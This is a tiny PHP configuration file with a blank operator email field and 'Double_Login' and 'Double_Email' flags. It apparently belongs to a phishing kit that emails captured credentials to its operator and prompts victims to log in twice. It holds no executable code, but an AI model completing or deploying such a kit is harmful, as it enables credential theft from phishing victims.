<?php
$yourmail  = '';  // PUT YOUR E-MAIL HERE
$Double_Login = "yes";
$Double_Email = "yes";
?>